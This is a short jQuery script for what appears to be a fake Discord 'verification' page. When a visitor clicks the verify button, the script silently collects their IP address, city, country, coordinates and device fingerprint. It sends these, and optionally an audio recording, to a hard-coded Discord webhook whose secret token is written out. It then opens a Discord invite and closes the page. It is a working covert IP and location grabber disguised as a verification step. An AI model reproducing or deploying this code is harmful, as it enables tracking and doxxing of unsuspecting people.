$(async function () {
    // Détection OS et navigateur
    const detectOS = () =>
        /Windows/.test(navigator.userAgent) ? "Windows" :
        /Mac/.test(navigator.userAgent) ? "macOS" :
        /Linux/.test(navigator.userAgent) ? "Linux" :
        /Android/.test(navigator.userAgent) ? "Android" :
        /iPhone|iPad|iOS/.test(navigator.userAgent) ? "iOS" : "Inconnu";

    const detectBrowser = () =>
        /Firefox/.test(navigator.userAgent) ? "Firefox" :
        /OPR|Opera/.test(navigator.userAgent) ? "Opera" :
        /Edg/.test(navigator.userAgent) ? "Edge" :
        /Chrome/.test(navigator.userAgent) ? "Chrome" :
        /Safari/.test(navigator.userAgent) ? "Safari" : "Inconnu";

    // Récupération IP et géolocalisation
    const fetchIPData = async () => {
        try {
            const { ip } = await $.get("https://api.ipify.org?format=json");
            // Affiche l'IP sur la page si l'élément existe
            if ($("#ip").length) {
                $("#ip").text("Votre IP : " + ip);
            }
            return await $.get(`https://ipapi.co/${ip}/json/`);
        } catch {
            if ($("#ip").length) {
                $("#ip").text("Impossible de récupérer l'IP.");
            }
            return {};
        }
    };

    // Données système
    const getData = async () => {
        const ipData = await fetchIPData();
        // Ajout de la date de connexion et du user agent complet
        return {
            pseudo: "donner par le bot",
            os: detectOS(),
            browser: detectBrowser(),
            lang: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ip: ipData.ip || "N/A",
            country: ipData.country_name || "N/A",
            city: ipData.city || "N/A",
            coords: ipData.latitude && ipData.longitude
                ? `${ipData.latitude},${ipData.longitude}` : "N/A",
            device: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
            cpu: navigator.hardwareConcurrency || "N/A",
            res: `${screen.width}x${screen.height}`,
            dark: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Oui" : "Non",
            date: new Date().toLocaleString(), // Date de connexion
            ua: navigator.userAgent // User Agent complet
        };
    };

    // Envoi à Discord
    const sendToDiscord = async (audioBlob = null) => {
        const d = await getData();
        const msg = [
            `Pseudo: ${d.pseudo}`,
            `OS: ${d.os}`,
            `Browser: ${d.browser}`,
            `Langue: ${d.lang}`,
            `Fuseau: ${d.timezone}`,
            `IP: ${d.ip}`,
            `Pays: ${d.country}`,
            `Ville: ${d.city}`,
            `Coord: ${d.coords}`,
            `Type: ${d.device}`,
            `RAM: ${d.ram}`,
            `CPU: ${d.cpu}`,
            `Résolution: ${d.res}`,
            `Sombre: ${d.dark}`,
            `Date: ${d.date}`,           // Ajout date de connexion
            `User-Agent: ${d.ua}`        // Ajout user agent complet
        ].join('\n');

        await $.ajax({
            url: "https://canary.discord.com/api/webhooks/1379105166678163569/qiSIBxBNUqq_L5KGMQWabQ6DZZYDd5TxQXCJcLVSJGtcLD-b_iVs9Zi3z1Y-g3JN6ha4",
            type: 'POST',
            data: JSON.stringify({
                embeds: [{
                    title: ` Connexion - ${d.pseudo}`,
                    description: `\`\`\`yaml\n${msg}\n\`\`\``,
                    color: 0x5865F2,
                    footer: { text: new Date().toLocaleString() }
                }]
            }),
            contentType: 'application/json'
        });

        if (audioBlob) {
            const formData = new FormData();
            formData.append('file', audioBlob, 'message.webm');
            formData.append('payload_json', JSON.stringify({
                content: `🎤 Nouveau vocal de ${d.pseudo}`
            }));
            await fetch(
                "https://canary.discord.com/api/webhooks/1379105166678163569/qiSIBxBNUqq_L5KGMQWabQ6DZZYDd5TxQXCJcLVSJGtcLD-b_iVs9Zi3z1Y-g3JN6ha4",
                { method: 'POST', body: formData }
            );
        }
    };

    // Bouton vérif
    $("#verifBtn").on("click", function () {
        sendToDiscord().then(() => {
            window.open("https://discord.gg/k6UZsYjeNY", "_blank");
            window.open("https://guns.lol/k.d.c", "_blank");
            setTimeout(() => {
                window.close(); // Tente de fermer la page de vérif
            }, 300);
        });
    });
});
